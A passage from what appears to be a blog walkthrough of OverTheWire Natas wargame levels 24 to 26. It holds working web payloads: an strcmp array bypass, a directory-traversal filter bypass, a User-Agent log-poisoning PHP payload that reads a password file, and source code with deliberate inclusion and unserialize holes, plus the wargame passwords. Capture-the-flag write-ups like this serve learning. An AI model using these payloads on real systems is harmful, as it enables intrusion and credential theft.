</span><span class='line'>    <span class="c1">// morla / 10111</span>
</span><span class='line'><span class="cp">?&gt;</span><span class="x">  </span>
</span></code></pre></td></tr></table></div></figure>


<p>This level is centered around exploiting the <em>strcmp</em> function. This function takes 2 strings as arguments and performs a case sensitive, binary safe string comparison:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>int strcmp ( string $str1 , string $str2 )
</span><span class='line'>Returns &lt; 0 if str1 is less than str2; &gt; 0 if str1 is greater than str2, and 0 if they are equal. </span></code></pre></td></tr></table></div></figure>


<p>When reading the user contributed notes in the manual, I noticed the mention of the necessity for both parameters to be strings, otherwise the return values would be unexpected, especially if given something like an array. Then I searched for some more information about the subject, check <a href="http://turbochaos.blogspot.jp/2013/08/exploiting-exotic-bugs-php-type-juggling.html">Chaotic Security blog</a> and the <a href="https://www.owasp.org/index.php/PHP_Security_Cheat_Sheet">OWASP PHP security cheatsheet</a>. If you pass an array to the function, it will return NULL, and PHP will treat it as a 0, hence fooling the code that you provided the correct password. So I did it like this: <a href="http://natas24.natas.labs.overthewire.org/?passwd">http://natas24.natas.labs.overthewire.org/?passwd</a>[]=pwn</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Warning: strcmp() expects parameter 1 to be string, array given in /var/www/natas/natas24/index.php on line 23
</span><span class='line'>
</span><span class='line'>The credentials for the next level are:
</span><span class='line'>
</span><span class='line'>Username: natas25 Password: GHF6X7YwACaYYssHVY05cFq83hRktl4c</span></code></pre></td></tr></table></div></figure>


<h3>Level 25</h3>

<p><img class="center" src="/images/overthewire/natas/natas25.png" title="natas25" alt="natas 25"></p>

<p>Here we have a page with a quote that we can choose to view in English or German.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&lt;?</span><span class="nx">php</span>
</span><span class='line'>    <span class="c1">// cheers and &lt;3 to malvina</span>
</span><span class='line'>    <span class="c1">// - morla</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">function</span> <span class="nf">setLanguage</span><span class="p">(){</span>
</span><span class='line'>        <span class="cm">/* language setup */</span>
</span><span class='line'>        <span class="k">if</span><span class="p">(</span><span class="nb">array_key_exists</span><span class="p">(</span><span class="s2">&quot;lang&quot;</span><span class="p">,</span><span class="nv">$_REQUEST</span><span class="p">))</span>
</span><span class='line'>            <span class="k">if</span><span class="p">(</span><span class="nx">safeinclude</span><span class="p">(</span><span class="s2">&quot;language/&quot;</span> <span class="o">.</span> <span class="nv">$_REQUEST</span><span class="p">[</span><span class="s2">&quot;lang&quot;</span><span class="p">]</span> <span class="p">))</span>
</span><span class='line'>                <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
</span><span class='line'>        <span class="nx">safeinclude</span><span class="p">(</span><span class="s2">&quot;language/en&quot;</span><span class="p">);</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">function</span> <span class="nf">safeinclude</span><span class="p">(</span><span class="nv">$filename</span><span class="p">){</span>
</span><span class='line'>        <span class="c1">// check for directory traversal</span>
</span><span class='line'>        <span class="k">if</span><span class="p">(</span><span class="nx">strstr</span><span class="p">(</span><span class="nv">$filename</span><span class="p">,</span><span class="s2">&quot;../&quot;</span><span class="p">)){</span>
</span><span class='line'>            <span class="nx">logRequest</span><span class="p">(</span><span class="s2">&quot;Directory traversal attempt! fixing request.&quot;</span><span class="p">);</span>
</span><span class='line'>            <span class="nv">$filename</span><span class="o">=</span><span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;../&quot;</span><span class="p">,</span><span class="s2">&quot;&quot;</span><span class="p">,</span><span class="nv">$filename</span><span class="p">);</span>
</span><span class='line'>        <span class="p">}</span>
</span><span class='line'>        <span class="c1">// dont let ppl steal our passwords</span>
</span><span class='line'>        <span class="k">if</span><span class="p">(</span><span class="nx">strstr</span><span class="p">(</span><span class="nv">$filename</span><span class="p">,</span><span class="s2">&quot;natas_webpass&quot;</span><span class="p">)){</span>
</span><span class='line'>            <span class="nx">logRequest</span><span class="p">(</span><span class="s2">&quot;Illegal file access detected! Aborting!&quot;</span><span class="p">);</span>
</span><span class='line'>            <span class="k">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
</span><span class='line'>        <span class="p">}</span>
</span><span class='line'>        <span class="c1">// add more checks...</span>
</span><span class='line'>
</span><span class='line'>        <span class="k">if</span> <span class="p">(</span><span class="nb">file_exists</span><span class="p">(</span><span class="nv">$filename</span><span class="p">))</span> <span class="p">{</span>
</span><span class='line'>            <span class="k">include</span><span class="p">(</span><span class="nv">$filename</span><span class="p">);</span>
</span><span class='line'>            <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
</span><span class='line'>        <span class="p">}</span>
</span><span class='line'>        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">function</span> <span class="nf">listFiles</span><span class="p">(</span><span class="nv">$path</span><span class="p">){</span>
</span><span class='line'>        <span class="nv">$listoffiles</span><span class="o">=</span><span class="k">array</span><span class="p">();</span>
</span><span class='line'>        <span class="k">if</span> <span class="p">(</span><span class="nv">$handle</span> <span class="o">=</span> <span class="nb">opendir</span><span class="p">(</span><span class="nv">$path</span><span class="p">))</span>
</span><span class='line'>            <span class="k">while</span> <span class="p">(</span><span class="k">false</span> <span class="o">!==</span> <span class="p">(</span><span class="nv">$file</span> <span class="o">=</span> <span class="nb">readdir</span><span class="p">(</span><span class="nv">$handle</span><span class="p">)))</span>
</span><span class='line'>                <span class="k">if</span> <span class="p">(</span><span class="nv">$file</span> <span class="o">!=</span> <span class="s2">&quot;.&quot;</span> <span class="o">&amp;&amp;</span> <span class="nv">$file</span> <span class="o">!=</span> <span class="s2">&quot;..&quot;</span><span class="p">)</span>
</span><span class='line'>                    <span class="nv">$listoffiles</span><span class="p">[]</span><span class="o">=</span><span class="nv">$file</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>        <span class="nb">closedir</span><span class="p">(</span><span class="nv">$handle</span><span class="p">);</span>
</span><span class='line'>        <span class="k">return</span> <span class="nv">$listoffiles</span><span class="p">;</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">function</span> <span class="nf">logRequest</span><span class="p">(</span><span class="nv">$message</span><span class="p">){</span>
</span><span class='line'>        <span class="nv">$log</span><span class="o">=</span><span class="s2">&quot;[&quot;</span><span class="o">.</span> <span class="nb">date</span><span class="p">(</span><span class="s2">&quot;d.m.Y H::i:s&quot;</span><span class="p">,</span><span class="nb">time</span><span class="p">())</span> <span class="o">.</span><span class="s2">&quot;]&quot;</span><span class="p">;</span>
</span><span class='line'>        <span class="nv">$log</span><span class="o">=</span><span class="nv">$log</span> <span class="o">.</span> <span class="s2">&quot; &quot;</span> <span class="o">.</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;HTTP_USER_AGENT&#39;</span><span class="p">];</span>
</span><span class='line'>        <span class="nv">$log</span><span class="o">=</span><span class="nv">$log</span> <span class="o">.</span> <span class="s2">&quot; </span><span class="se">\&quot;</span><span class="s2">&quot;</span> <span class="o">.</span> <span class="nv">$message</span> <span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;\n</span><span class="s2">&quot;</span><span class="p">;</span>
</span><span class='line'>        <span class="nv">$fd</span><span class="o">=</span><span class="nb">fopen</span><span class="p">(</span><span class="s2">&quot;/tmp/natas25_&quot;</span> <span class="o">.</span> <span class="nb">session_id</span><span class="p">()</span> <span class="o">.</span><span class="s2">&quot;.log&quot;</span><span class="p">,</span><span class="s2">&quot;a&quot;</span><span class="p">);</span>
</span><span class='line'>        <span class="nb">fwrite</span><span class="p">(</span><span class="nv">$fd</span><span class="p">,</span><span class="nv">$log</span><span class="p">);</span>
</span><span class='line'>        <span class="nb">fclose</span><span class="p">(</span><span class="nv">$fd</span><span class="p">);</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
</span></code></pre></td></tr></table></div></figure>


<p>At first it would seem that we have to find a way to traverse to <code>/etc/natas_webpass</code> and read the password from there, however there is a check in the code to prevent us from going there. So I next looked at bypassing the LFI filter and played a bit in a PHP sandbox to see which injection would work against the filter. Finally, I was able to read the log file with this injection: <code>lang=&hellip;.//&hellip;.//&hellip;.//&hellip;.//&hellip;.//tmp/natas25_6n8g6cuqkbuthmp8usvql1vej2.log</code></p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[17.10.2015 14::02:27] Mozilla/5.0 (X11; Linux x86_64; rv:40.0) Gecko/20100101 Firefox/40.0 "Directory traversal attempt! fixing request." [17.10.2015 14::02:38] Mozilla/5.0 (X11; Linux x86_64; rv:40.0) Gecko/20100101 Firefox/40.0 "Directory traversal attempt! fixing request."
</span><span class='line'>Notice: Undefined variable: __GREETING in /var/www/natas/natas25/index.php on line 80
</span><span class='line'>
</span><span class='line'>Notice: Undefined variable: __MSG in /var/www/natas/natas25/index.php on line 81
</span><span class='line'>
</span><span class='line'>Notice: Undefined variable: __FOOTER in /var/www/natas/natas25/index.php on line 82</span></code></pre></td></tr></table></div></figure>


<p>Excellent, now we&rsquo;re getting somewhere! The next technique we&rsquo;ll use to get the password is a log poisoning attack. Read more <a href="http://hackerforhire.com.au/apache-log-poisoning-with-local-file-inclusion/">here</a></p>

<p>If you look at the <em>logRequest</em> function you will see that it appends various information to a log file. Part of this information is under our control (the User Agent). By using the log poisoning attack, we can change the User Agent to some PHP code of our choosing, that will then get written to the log file when we do an action which should be logged. And when the server reads the log file, it will happily execute the code contained within. Let&rsquo;s see this in practice:</p>

<ul>
<li><p>I changed my user agent to <code>&lt;?php readfile(&lsquo;/etc/natas_webpass/natas26&rsquo;); ?></code></p></li>
<li><p>Then I refreshed the page where I was looking at the log file and among all the logged information was also the password:</p></li>
</ul>


<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>"Directory traversal attempt! fixing request." [17.10.2015 15::56:48] oGgWAJ7zcGT28vYazGo4rkhOPDhBu34T </span></code></pre></td></tr></table></div></figure>


<p>The password is <code>oGgWAJ7zcGT28vYazGo4rkhOPDhBu34T</code></p>

<h3>Level 26</h3>

<p><img class="center" src="/images/overthewire/natas/natas26.png" title="natas26" alt="natas 26"></p>

<p>Source code:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
<span class='line-number'>89</span>
<span class='line-number'>90</span>
<span class='line-number'>91</span>
<span class='line-number'>92</span>
<span class='line-number'>93</span>
<span class='line-number'>94</span>
<span class='line-number'>95</span>
<span class='line-number'>96</span>
<span class='line-number'>97</span>
<span class='line-number'>98</span>
<span class='line-number'>99</span>
<span class='line-number'>100</span>
<span class='line-number'>101</span>
<span class='line-number'>102</span>
<span class='line-number'>103</span>
<span class='line-number'>104</span>
<span class='line-number'>105</span>
<span class='line-number'>106</span>
<span class='line-number'>107</span>
<span class='line-number'>108</span>
<span class='line-number'>109</span>
<span class='line-number'>110</span>
<span class='line-number'>111</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&lt;?</span><span class="nx">php</span>
</span><span class='line'>    <span class="c1">// sry, this is ugly as hell.</span>
</span><span class='line'>    <span class="c1">// cheers kaliman ;)</span>
</span><span class='line'>    <span class="c1">// - morla</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">class</span> <span class="nc">Logger</span><span class="p">{</span>
</span><span class='line'>        <span class="k">private</span> <span class="nv">$logFile</span><span class="p">;</span>
</span><span class='line'>        <span class="k">private</span> <span class="nv">$initMsg</span><span class="p">;</span>
</span><span class='line'>        <span class="k">private</span> <span class="nv">$exitMsg</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>        <span class="k">function</span> <span class="nf">__construct</span><span class="p">(</span><span class="nv">$file</span><span class="p">){</span>
</span><span class='line'>            <span class="c1">// initialise variables</span>
</span><span class='line'>            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">initMsg</span><span class="o">=</span><span class="s2">&quot;#--session started--#</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
</span><span class='line'>            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">exitMsg</span><span class="o">=</span><span class="s2">&quot;#--session end--#</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
</span><span class='line'>            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">logFile</span> <span class="o">=</span> <span class="s2">&quot;/tmp/natas26_&quot;</span> <span class="o">.</span> <span class="nv">$file</span> <span class="o">.</span> <span class="s2">&quot;.log&quot;</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>            <span class="c1">// write initial message</span>
</span><span class='line'>            <span class="nv">$fd</span><span class="o">=</span><span class="nb">fopen</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">logFile</span><span class="p">,</span><span class="s2">&quot;a+&quot;</span><span class="p">);</span>
</span><span class='line'>            <span class="nb">fwrite</span><span class="p">(</span><span class="nv">$fd</span><span class="p">,</span><span class="nv">$initMsg</span><span class="p">);</span>
</span><span class='line'>            <span class="nb">fclose</span><span class="p">(</span><span class="nv">$fd</span><span class="p">);</span>
</span><span class='line'>        <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>        <span class="k">function</span> <span class="nf">log</span><span class="p">(</span><span class="nv">$msg</span><span class="p">){</span>
</span><span class='line'>            <span class="nv">$fd</span><span class="o">=</span><span class="nb">fopen</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">logFile</span><span class="p">,</span><span class="s2">&quot;a+&quot;</span><span class="p">);</span>
</span><span class='line'>            <span class="nb">fwrite</span><span class="p">(</span><span class="nv">$fd</span><span class="p">,</span><span class="nv">$msg</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">);</span>
</span><span class='line'>            <span class="nb">fclose</span><span class="p">(</span><span class="nv">$fd</span><span class="p">);</span>
</span><span class='line'>        <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>        <span class="k">function</span> <span class="nf">__destruct</span><span class="p">(){</span>
</span><span class='line'>            <span class="c1">// write exit message</span>
</span><span class='line'>            <span class="nv">$fd</span><span class="o">=</span><span class="nb">fopen</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">logFile</span><span class="p">,</span><span class="s2">&quot;a+&quot;</span><span class="p">);</span>
</span><span class='line'>            <span class="nb">fwrite</span><span class="p">(</span><span class="nv">$fd</span><span class="p">,</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">exitMsg</span><span class="p">);</span>
</span><span class='line'>            <span class="nb">fclose</span><span class="p">(</span><span class="nv">$fd</span><span class="p">);</span>
</span><span class='line'>        <span class="p">}</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">function</span> <span class="nf">showImage</span><span class="p">(</span><span class="nv">$filename</span><span class="p">){</span>
</span><span class='line'>        <span class="k">if</span><span class="p">(</span><span class="nb">file_exists</span><span class="p">(</span><span class="nv">$filename</span><span class="p">))</span>
</span><span class='line'>            <span class="k">echo</span> <span class="s2">&quot;&lt;img src=</span><span class="se">\&quot;</span><span class="si">$filename</span><span class="se">\&quot;</span><span class="s2">&gt;&quot;</span><span class="p">;</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">function</span> <span class="nf">drawImage</span><span class="p">(</span><span class="nv">$filename</span><span class="p">){</span>
</span><span class='line'>        <span class="nv">$img</span><span class="o">=</span><span class="nx">imagecreatetruecolor</span><span class="p">(</span><span class="mi">400</span><span class="p">,</span><span class="mi">300</span><span class="p">);</span>
</span><span class='line'>        <span class="nx">drawFromUserdata</span><span class="p">(</span><span class="nv">$img</span><span class="p">);</span>
</span><span class='line'>        <span class="nx">imagepng</span><span class="p">(</span><span class="nv">$img</span><span class="p">,</span><span class="nv">$filename</span><span class="p">);</span>
</span><span class='line'>        <span class="nx">imagedestroy</span><span class="p">(</span><span class="nv">$img</span><span class="p">);</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">function</span> <span class="nf">drawFromUserdata</span><span class="p">(</span><span class="nv">$img</span><span class="p">){</span>
</span><span class='line'>        <span class="k">if</span><span class="p">(</span> <span class="nb">array_key_exists</span><span class="p">(</span><span class="s2">&quot;x1&quot;</span><span class="p">,</span> <span class="nv">$_GET</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nb">array_key_exists</span><span class="p">(</span><span class="s2">&quot;y1&quot;</span><span class="p">,</span> <span class="nv">$_GET</span><span class="p">)</span> <span class="o">&amp;&amp;</span>
</span><span class='line'>            <span class="nb">array_key_exists</span><span class="p">(</span><span class="s2">&quot;x2&quot;</span><span class="p">,</span> <span class="nv">$_GET</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nb">array_key_exists</span><span class="p">(</span><span class="s2">&quot;y2&quot;</span><span class="p">,</span> <span class="nv">$_GET</span><span class="p">)){</span>
</span><span class='line'>
</span><span class='line'>            <span class="nv">$color</span><span class="o">=</span><span class="nx">imagecolorallocate</span><span class="p">(</span><span class="nv">$img</span><span class="p">,</span><span class="mh">0xff</span><span class="p">,</span><span class="mh">0x12</span><span class="p">,</span><span class="mh">0x1c</span><span class="p">);</span>
</span><span class='line'>            <span class="nx">imageline</span><span class="p">(</span><span class="nv">$img</span><span class="p">,</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">&quot;x1&quot;</span><span class="p">],</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s2">&quot;y1&quot;</span><span class="p">],</span>
</span><span class='line'>                            <span class="nv">$_GET</span><span class="p">[</span><span class="s2">&quot;x2&quot;</span><span class="p">],</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s2">&quot;y2&quot;</span><span class="p">],</span> <span class="nv">$color</span><span class="p">);</span>
</span><span class='line'>        <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>        <span class="k">if</span> <span class="p">(</span><span class="nb">array_key_exists</span><span class="p">(</span><span class="s2">&quot;drawing&quot;</span><span class="p">,</span> <span class="nv">$_COOKIE</span><span class="p">)){</span>
</span><span class='line'>            <span class="nv">$drawing</span><span class="o">=</span><span class="nb">unserialize</span><span class="p">(</span><span class="nb">base64_decode</span><span class="p">(</span><span class="nv">$_COOKIE</span><span class="p">[</span><span class="s2">&quot;drawing&quot;</span><span class="p">]));</span>
</span><span class='line'>            <span class="k">if</span><span class="p">(</span><span class="nv">$drawing</span><span class="p">)</span>
</span><span class='line'>                <span class="k">foreach</span><span class="p">(</span><span class="nv">$drawing</span> <span class="k">as</span> <span class="nv">$object</span><span class="p">)</span>
</span><span class='line'>                    <span class="k">if</span><span class="p">(</span> <span class="nb">array_key_exists</span><span class="p">(</span><span class="s2">&quot;x1&quot;</span><span class="p">,</span> <span class="nv">$object</span><span class="p">)</span> <span class="o">&amp;&amp;</span>
</span><span class='line'>                        <span class="nb">array_key_exists</span><span class="p">(</span><span class="s2">&quot;y1&quot;</span><span class="p">,</span> <span class="nv">$object</span><span class="p">)</span> <span class="o">&amp;&amp;</span>
</span><span class='line'>                        <span class="nb">array_key_exists</span><span class="p">(</span><span class="s2">&quot;x2&quot;</span><span class="p">,</span> <span class="nv">$object</span><span class="p">)</span> <span class="o">&amp;&amp;</span>
</span><span class='line'>                        <span class="nb">array_key_exists</span><span class="p">(</span><span class="s2">&quot;y2&quot;</span><span class="p">,</span> <span class="nv">$object</span><span class="p">)){</span>
</span><span class='line'>
</span><span class='line'>                        <span class="nv">$color</span><span class="o">=</span><span class="nx">imagecolorallocate</span><span class="p">(</span><span class="nv">$img</span><span class="p">,</span><span class="mh">0xff</span><span class="p">,</span><span class="mh">0x12</span><span class="p">,</span><span class="mh">0x1c</span><span class="p">);</span>
</span><span class='line'>                        <span class="nx">imageline</span><span class="p">(</span><span class="nv">$img</span><span class="p">,</span><span class="nv">$object</span><span class="p">[</span><span class="s2">&quot;x1&quot;</span><span class="p">],</span><span class="nv">$object</span><span class="p">[</span><span class="s2">&quot;y1&quot;</span><span class="p">],</span>
</span><span class='line'>                                <span class="nv">$object</span><span class="p">[</span><span class="s2">&quot;x2&quot;</span><span class="p">]</span> <span class="p">,</span><span class="nv">$object</span><span class="p">[</span><span class="s2">&quot;y2&quot;</span><span class="p">]</span> <span class="p">,</span><span class="nv">$color</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>                    <span class="p">}</span>
</span><span class='line'>        <span class="p">}</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">function</span> <span class="nf">storeData</span><span class="p">(){</span>
</span><span class='line'>        <span class="nv">$new_object</span><span class="o">=</span><span class="k">array</span><span class="p">();</span>
</span><span class='line'>
</span><span class='line'>        <span class="k">if</span><span class="p">(</span><span class="nb">array_key_exists</span><span class="p">(</span><span class="s2">&quot;x1&quot;</span><span class="p">,</span> <span class="nv">$_GET</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nb">array_key_exists</span><span class="p">(</span><span class="s2">&quot;y1&quot;</span><span class="p">,</span> <span class="nv">$_GET</span><span class="p">)</span> <span class="o">&amp;&amp;</span>
</span><span class='line'>            <span class="nb">array_key_exists</span><span class="p">(</span><span class="s2">&quot;x2&quot;</span><span class="p">,</span> <span class="nv">$_GET</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nb">array_key_exists</span><span class="p">(</span><span class="s2">&quot;y2&quot;</span><span class="p">,</span> <span class="nv">$_GET</span><span class="p">)){</span>
</span><span class='line'>            <span class="nv">$new_object</span><span class="p">[</span><span class="s2">&quot;x1&quot;</span><span class="p">]</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">&quot;x1&quot;</span><span class="p">];</span>
</span><span class='line'>            <span class="nv">$new_object</span><span class="p">[</span><span class="s2">&quot;y1&quot;</span><span class="p">]</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">&quot;y1&quot;</span><span class="p">];</span>
</span><span class='line'>            <span class="nv">$new_object</span><span class="p">[</span><span class="s2">&quot;x2&quot;</span><span class="p">]</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">&quot;x2&quot;</span><span class="p">];</span>
</span><span class='line'>            <span class="nv">$new_object</span><span class="p">[</span><span class="s2">&quot;y2&quot;</span><span class="p">]</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">&quot;y2&quot;</span><span class="p">];</span>
</span><span class='line'>        <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>        <span class="k">if</span> <span class="p">(</span><span class="nb">array_key_exists</span><span class="p">(</span><span class="s2">&quot;drawing&quot;</span><span class="p">,</span> <span class="nv">$_COOKIE</span><span class="p">)){</span>
</span><span class='line'>            <span class="nv">$drawing</span><span class="o">=</span><span class="nb">unserialize</span><span class="p">(</span><span class="nb">base64_decode</span><span class="p">(</span><span class="nv">$_COOKIE</span><span class="p">[</span><span class="s2">&quot;drawing&quot;</span><span class="p">]));</span>
</span><span class='line'>        <span class="p">}</span>
</span><span class='line'>        <span class="k">else</span><span class="p">{</span>
</span><span class='line'>            <span class="c1">// create new array</span>
</span><span class='line'>            <span class="nv">$drawing</span><span class="o">=</span><span class="k">array</span><span class="p">();</span>
</span><span class='line'>        <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>        <span class="nv">$drawing</span><span class="p">[]</span><span class="o">=</span><span class="nv">$new_object</span><span class="p">;</span>
</span><span class='line'>        <span class="nx">setcookie</span><span class="p">(</span><span class="s2">&quot;drawing&quot;</span><span class="p">,</span><span class="nb">base64_encode</span><span class="p">(</span><span class="nb">serialize</span><span class="p">(</span><span class="nv">$drawing</span><span class="p">)));</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
</span><span class='line'>
</span><span class='line'><span class="cp">&lt;?php</span>
</span><span class='line'>    <span class="nb">session_start</span><span class="p">();</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">if</span> <span class="p">(</span><span class="nb">array_key_exists</span><span class="p">(</span><span class="s2">&quot;drawing&quot;</span><span class="p">,</span> <span class="nv">$_COOKIE</span><span class="p">)</span> <span class="o">||</span>
</span><span class='line'>        <span class="p">(</span>   <span class="nb">array_key_exists</span><span class="p">(</span><span class="s2">&quot;x1&quot;</span><span class="p">,</span> <span class="nv">$_GET</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nb">array_key_exists</span><span class="p">(</span><span class="s2">&quot;y1&quot;</span><span class="p">,</span> <span class="nv">$_GET</span><span class="p">)</span> <span class="o">&amp;&amp;</span>
